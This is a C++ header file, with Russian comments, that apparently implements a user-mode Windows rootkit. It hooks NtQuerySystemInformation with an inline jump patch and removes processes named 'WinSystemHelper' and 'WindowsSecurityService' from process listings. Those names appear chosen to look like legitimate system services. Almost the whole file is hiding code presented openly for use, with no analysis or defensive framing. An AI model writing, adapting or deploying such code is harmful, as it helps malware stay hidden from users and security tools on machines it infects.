#pragma once
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include <string>
#include <winternl.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace rootkit {
    // Определяем необходимые структуры
    typedef struct _SYSTEM_PROCESS_INFO {
        ULONG NextEntryOffset;
        ULONG NumberOfThreads;
        BYTE Reserved1[48];
        UNICODE_STRING ImageName;
        LONG BasePriority;
        HANDLE UniqueProcessId;
        PVOID Reserved2;
        ULONG HandleCount;
        ULONG SessionId;
        PVOID Reserved3;
        SIZE_T PeakVirtualSize;
        SIZE_T VirtualSize;
        ULONG Reserved4;
        SIZE_T PeakWorkingSetSize;
        SIZE_T WorkingSetSize;
        PVOID Reserved5;
        SIZE_T QuotaPagedPoolUsage;
        PVOID Reserved6;
        SIZE_T QuotaNonPagedPoolUsage;
        SIZE_T PagefileUsage;
        SIZE_T PeakPagefileUsage;
        SIZE_T PrivatePageCount;
    } SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;

    // Структура для хранения оригинальных байтов
    struct HookData {
        BYTE original[5];
        DWORD address;
    };

    class Rootkit {
    private:
        std::vector<HookData> hooks;
        
        // Функция для установки хука
        bool SetHook(DWORD targetAddr, DWORD hookAddr) {
            HookData hook;
            hook.address = targetAddr;
            
            // Сохраняем оригинальные байты
            if (!ReadProcessMemory(GetCurrentProcess(), (LPVOID)targetAddr, 
                                hook.original, 5, nullptr)) {
                return false;
            }
            
            // Устанавливаем хук
            BYTE jmpCode[5] = { 0xE9, 0x00, 0x00, 0x00, 0x00 };
            DWORD relativeAddr = hookAddr - targetAddr - 5;
            memcpy(&jmpCode[1], &relativeAddr, 4);
            
            DWORD oldProtect;
            if (!VirtualProtect((LPVOID)targetAddr, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                return false;
            }

            if (!WriteProcessMemory(GetCurrentProcess(), (LPVOID)targetAddr, 
                                 jmpCode, 5, nullptr)) {
                VirtualProtect((LPVOID)targetAddr, 5, oldProtect, &oldProtect);
                return false;
            }

            VirtualProtect((LPVOID)targetAddr, 5, oldProtect, &oldProtect);
            hooks.push_back(hook);
            return true;
        }
        
        // Скрытие процесса из списка процессов
        static NTSTATUS WINAPI HookedNtQuerySystemInformation(
            SYSTEM_INFORMATION_CLASS SystemInformationClass,
            PVOID SystemInformation,
            ULONG SystemInformationLength,
            PULONG ReturnLength) 
        {
            typedef NTSTATUS (WINAPI* NtQuerySystemInformation_t)(
                SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
            
            static NtQuerySystemInformation_t OriginalFunc = 
                (NtQuerySystemInformation_t)GetProcAddress(
                    GetModuleHandleA("ntdll.dll"), 
                    "NtQuerySystemInformation"
                );
            
            NTSTATUS status = OriginalFunc(
                SystemInformationClass, 
                SystemInformation,
                SystemInformationLength, 
                ReturnLength
            );
            
            if (NT_SUCCESS(status) && 
                SystemInformationClass == SystemProcessInformation) 
            {
                PSYSTEM_PROCESS_INFO curr = (PSYSTEM_PROCESS_INFO)SystemInformation;
                PSYSTEM_PROCESS_INFO prev = nullptr;
                
                while (curr) {
                    BOOL hidden = FALSE;
                    
                    if (curr->ImageName.Buffer && 
                        (wcsstr(curr->ImageName.Buffer, L"WinSystemHelper") ||
                         wcsstr(curr->ImageName.Buffer, L"WindowsSecurityService"))) 
                    {
                        hidden = TRUE;
                    }
                    
                    if (hidden) {
                        if (prev) {
                            if (curr->NextEntryOffset) {
                                prev->NextEntryOffset += curr->NextEntryOffset;
                            } else {
                                prev->NextEntryOffset = 0;
                            }
                        } else {
                            if (curr->NextEntryOffset) {
                                RtlCopyMemory(
                                    SystemInformation,
                                    (PBYTE)curr + curr->NextEntryOffset,
                                    SystemInformationLength - curr->NextEntryOffset
                                );
                            }
                        }
                    } else {
                        prev = curr;
                    }
                    
                    if (curr->NextEntryOffset == 0) {
                        break;
                    }
                    curr = (PSYSTEM_PROCESS_INFO)((PBYTE)curr + curr->NextEntryOffset);
                }
            }
            return status;
        }

    public:
        bool Install() {
            HMODULE ntdll = GetModuleHandleA("ntdll.dll");
            if (!ntdll) return false;
            
            DWORD ntQueryAddr = (DWORD)GetProcAddress(
                ntdll, 
                "NtQuerySystemInformation"
            );
            if (!ntQueryAddr) return false;
            
            return SetHook(ntQueryAddr, (DWORD)HookedNtQuerySystemInformation);
        }
        
        void Remove() {
            for (const auto& hook : hooks) {
                DWORD oldProtect;
                VirtualProtect((LPVOID)hook.address, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
                WriteProcessMemory(GetCurrentProcess(), (LPVOID)hook.address, 
                                 hook.original, 5, nullptr);
                VirtualProtect((LPVOID)hook.address, 5, oldProtect, &oldProtect);
            }
            hooks.clear();
        }
    };
} 